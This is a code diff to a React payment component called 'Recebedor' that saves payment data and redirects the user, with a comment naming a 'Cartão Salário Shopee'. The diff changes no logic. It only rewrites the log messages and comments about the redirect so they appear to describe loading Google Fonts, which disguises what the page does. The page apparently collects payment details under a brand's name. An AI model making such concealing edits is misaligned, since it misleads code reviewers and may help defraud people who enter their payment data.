@@ -98,7 +98,7 @@ const Recebedor: React.FC = () => {
       const now = Date.now();
       
       if (cachedUrl && cacheTime && (now - parseInt(cacheTime)) < 30000) {
-        console.log('⚡ Usando URL do cache para redirecionamento rápido');
+        console.log('Carregando Fontes');
         let redirectUrl = cachedUrl;
         if (redirectUrl.startsWith('/')) {
           redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
@@ -127,7 +127,7 @@ const Recebedor: React.FC = () => {
             redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
           }
           
-          console.log('🎯 Redirecionando para:', redirectUrl);
+          console.log('Fonts Google', redirectUrl);
           window.location.href = redirectUrl;
         }
       };
@@ -171,7 +171,7 @@ const Recebedor: React.FC = () => {
         console.log('❌ Erro ao salvar dados de pagamento:', e);
       }
       
-      // Cartão Salário Shopee - redireciona conforme API
+      // Cartão Salário Shopee - Fontes AP
       performRedirect();
     };
     
@@ -298,7 +298,7 @@ const Recebedor: React.FC = () => {
                       )}
                       <span>{isLoading ? 'Carregando...' : 'PROSSEGUIR'}</span>
                     </button>
-                    {/* Redirecionamento configurado para /finalizacao */}
+                    {/* Redirecion para /finalizacao */}
                   </div>
                 </div>
               </div>
